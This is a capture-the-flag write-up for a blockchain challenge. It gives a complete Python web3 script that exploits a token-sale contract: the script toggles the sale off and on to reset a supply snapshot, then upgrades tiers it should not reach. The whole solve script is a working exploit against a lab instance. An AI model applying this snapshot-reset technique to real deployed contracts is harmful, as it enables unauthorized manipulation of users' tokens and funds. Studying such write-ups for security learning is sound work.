# nexus - Blockchain

## Methodology
* **Vulnerability:** Smurfing Attack due to Inconsistent Validation Logic
* **Steps:**
    1.  Access the GZCLI Instance on port 50000.
    2.  Access the TCP Port Mapping page.
    3.  Solve the crypto challenge to access `RPC_URL, PRIVKEY, SETUP_ADDR, WALLET_ADDR`.
    4.  Run `solve.py` (explained below) against the instance.
    5.  Claim Flag.

## Reproducibility (Code/Commands)
```python
import time
from web3 import Web3

RPC_URL = ""
PRIVATE_KEY = ""
SETUP_ADDRESS = "" 

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
user_address = account.address

# Minimal - we only need the definitions for the functions we call
setup_abi = [
    {"inputs": [], "name": "tge", "outputs": [{"internalType": "contract TGE", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "token", "outputs": [{"internalType": "contract Token", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"internalType": "bool", "name": "_tge", "type": "bool"}], "name": "enableTge", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
]

token_abi = [
    {"inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "value", "type": "uint256"}], "name": "approve", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"}
]

tge_abi = [
    {"inputs": [], "name": "buy", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "uint256", "name": "tier", "type": "uint256"}], "name": "upgrade", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]

setup_contract = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)

# Get the addresses of the TGE and Token contracts from the Setup contract
tge_address = setup_contract.functions.tge().call()
token_address = setup_contract.functions.token().call()

token_contract = w3.eth.contract(address=token_address, abi=token_abi)
tge_contract = w3.eth.contract(address=tge_address, abi=tge_abi)

# Send Transactions
def send_tx(contract_function, gas_limit=500000):
    tx = contract_function.build_transaction({
        'from': user_address,
        'nonce': w3.eth.get_transaction_count(user_address),
        'gas': gas_limit,
        'gasPrice': w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Sent tx: {tx_hash.hex()} ... waiting")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt.status == 1:
        print(" -> Success!")
    else:
        print(" -> FAILED!")
        exit(1)
    return receipt

# Exploit

# 1. Approve TGE to spend your tokens - very large amount to be safe.
send_tx(token_contract.functions.approve(tge_address, 2**256 - 1))

# 2. Buy Tier 1
send_tx(tge_contract.functions.buy())

# 3. Disable TGE (Triggers the empty snapshot for Tiers 2 & 3)
send_tx(setup_contract.functions.enableTge(False))

# 4. Enable TGE (Allows upgrading, but keeps the old snapshot)
send_tx(setup_contract.functions.enableTge(True))

# 5. Upgrade to Tier 2
# This works because your balance becomes 1, and the snapshot supply is 0. 1 > 0.
send_tx(tge_contract.functions.upgrade(2))

# 6. Upgrade to Tier 3
send_tx(tge_contract.functions.upgrade(3))

# 7. Verify
solved = setup_contract.functions.isSolved().call()
if solved:
    print("\nFlag captured.")
else:
    print("\nSomething went wrong.")
```

## 🤖 AI Usage

* Gemini 3 Pro used to generate the ABIs, initial setup and transaction sending.
* Otherwise, `solve.py` written manually.

## 🚩 Proof

Flag: C2C{...}
